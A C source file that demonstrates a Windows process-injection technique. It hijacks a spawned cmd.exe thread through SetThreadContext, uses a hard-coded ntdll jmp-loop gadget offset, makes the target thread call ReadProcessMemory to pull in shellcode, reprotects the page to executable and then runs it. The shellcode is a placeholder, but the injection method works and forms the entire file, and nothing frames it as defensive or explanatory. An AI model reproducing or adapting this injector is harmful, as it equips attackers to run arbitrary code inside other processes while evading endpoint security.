#include <Windows.h>

// example shellcode
// make sure to have 8 reserved bytes for 64-bit ret
// gadget to rop into the actual shellcode
CHAR shellcode[] = {
    // 8 bytes here for jmp loop gadget 
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    // actual shellcode starts here
    0xEB, 0xFE, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAA,
    0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x90, 0x90, 0x90
};

VOID
SetExecutionContext(
    _In_ HANDLE *hThread,
    _In_opt_ LPVOID Rip,
    _In_opt_ LPVOID Rsp,
    _In_opt_ LPVOID Arg1,
    _In_opt_ LPVOID Arg2,
    _In_opt_ LPVOID Arg3,
    _In_opt_ LPVOID Arg4
)
{
    CONTEXT ctx;

    SuspendThread(*hThread);

    ZeroMemory(&ctx, sizeof(CONTEXT));
    ctx.ContextFlags = CONTEXT_ALL;
    GetThreadContext(*hThread, &ctx);

    if (Rip) {
        ctx.Rip = Rip;
    }

    if (Rsp) {
        ctx.Rsp = Rsp;
    }

    if (Arg1) {
        ctx.Rcx = Arg1;
    }

    if (Arg2) {
        ctx.Rdx = Arg2;
    }

    if (Arg3) {
        ctx.R8 = Arg3;
    }

    if (Arg4) {
        ctx.R9 = Arg4;
    }

    SetThreadContext(*hThread, &ctx);
    
    ResumeThread(*hThread);

    // sleep so the setthreadcontext can take effect
    Sleep(1000);
}

int
main(
    _In_ int argc,
	_In_ char *argv[]
)
{
    STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;

    ZeroMemory(&pi, sizeof(pi));

    // do whatever you need to do here to get proc and thread handle
    CreateProcessW(
        L"C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi
    );

    HANDLE hThread = pi.hThread;
    HANDLE hProcess = pi.hProcess;


    // allocate page for stack and code
    // lower memory address half for stack, the other for shellcode
    LPVOID lpAddress = VirtualAllocEx(hProcess, 0, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    // jmp loop gadget to stall to reprotect shellcode section to RX
    *(ULONG_PTR*)shellcode = (PVOID)((LPBYTE)GetModuleHandle(L"ntdll.dll") + 0x1CF2B);

    SetExecutionContext(
        &hThread,
        // set rip to jmp loop first to allow setthreadcontext to use volatile registers
        // warning: this can change on ntdll versions
        (PVOID)((LPBYTE)GetModuleHandle(L"ntdll.dll") + 0x1CF2B),
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );

    
    // dupe self proc handle so target proc can read us
    HANDLE hProc;
    DuplicateHandle(
        GetCurrentProcess(),
        GetCurrentProcess(),
        hProcess,
        &hProc,
        0,
        FALSE,
        DUPLICATE_SAME_ACCESS
    );

    // get target process to read shellcode
    SetExecutionContext(
        &hThread,
        // set rip to read our shellcode
        GetProcAddress(GetModuleHandle(L"kernel32.dll"), "ReadProcessMemory"),
        (ULONG_PTR)lpAddress + 0x1000,
        // duplicated handle to our own process to read shellcode
        hProc,
        &shellcode,
        // shellcode buffer
        (ULONG_PTR)lpAddress + 0x1000,
        sizeof(shellcode)
    );

    // reprotect shellcode page to RX
    DWORD flOldProtect;
    VirtualProtectEx(hProcess, (LPBYTE)lpAddress + 0x1000, sizeof(shellcode), PAGE_EXECUTE_READ, &flOldProtect);

    // run the shellcodez
    SetExecutionContext(
        &hThread,
        // set rip to execute shellcode
        (ULONG_PTR)lpAddress + 0x1000 + 8,
        NULL,
        // arguments are optional
        NULL,
        NULL,
        NULL,
        NULL
    );

	return 0;
}